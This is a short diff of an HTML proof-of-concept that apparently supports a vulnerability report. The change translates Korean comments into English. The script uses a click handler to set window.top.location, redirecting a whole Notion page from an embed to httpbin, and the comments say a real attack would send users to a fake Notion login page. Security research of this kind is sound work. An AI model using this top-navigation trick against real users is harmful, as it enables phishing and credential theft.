@@ -193,9 +193,9 @@ body {
 
 <script>
 document.getElementById('clickTarget').addEventListener('click', function() {
-    // PoC: 사용자 클릭 시 Notion 전체 페이지를 외부로 리다이렉트
-    // 실제 공격에서는 Notion 로그인 페이지를 모방한 피싱 사이트가 됨
-    // 여기서는 PoC이므로 httpbin으로 리다이렉트하여 성공을 증명
+    // PoC: Redirects the entire Notion page to an external site when the user clicks
+    // In a real attack, this would be a phishing site mimicking the Notion login page
+    // Since this is a PoC, it redirects to httpbin to demonstrate success
     window.top.location = 'https://httpbin.org/get?proof=notion-embed-top-navigation-poc';
 });
 </script>
